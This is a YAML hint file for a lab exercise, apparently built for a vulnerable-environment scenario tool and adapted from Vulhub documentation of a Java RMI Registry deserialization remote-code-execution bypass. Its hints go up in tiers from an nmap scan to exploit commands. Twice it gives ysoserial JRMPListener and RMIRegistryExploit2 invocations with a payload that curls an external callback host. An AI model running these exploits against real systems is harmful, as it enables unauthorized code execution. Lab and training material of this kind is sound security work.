@@ -1,0 +1,72 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: java/rmi-registry-bind-deserialization-bypass
+hint_levels:
+  low:
+  - Inspect the java service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 1099. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass.'
+  - |-
+    Vulnerability Reproduction
+
+    Use RMIRegistryExploit2 or RMIRegistryExploit3 from ysoserial: https://github.com/wh1t3p1g/ysoserial's exploit package to perform the attack:
+
+    ```bash
+    # Start JRMPListener
+    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
+    # Launch the attack
+    java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization-bypass/1.png
+
+    The Registry will return an error, but this is normal and the command will still execute successfully.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization-bypass/README.md'
+  - |-
+    Additional public references:
+    - https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
+    - https://github.com/wh1t3p1g/ysoserial
+access_instructions:
+  title: Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 1099. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Use RMIRegistryExploit2 or RMIRegistryExploit3 from ysoserial: https://github.com/wh1t3p1g/ysoserial's exploit package to perform the attack:
+
+      ```bash
+      # Start JRMPListener
+      java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
+      # Launch the attack
+      java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization-bypass/1.png
+
+      The Registry will return an error, but this is normal and the command will still execute successfully.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization-bypass/README.md
+  readme_sha256: 8438c077c7aedf8445e6ad1c276e1f4829960763644c26a26fcaed3cda42cf17
+  compose_sha256: 5b0bcbd061e478cdf90a24953551e35e21f60e0a6324bf6e001205d9e477f8fc
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
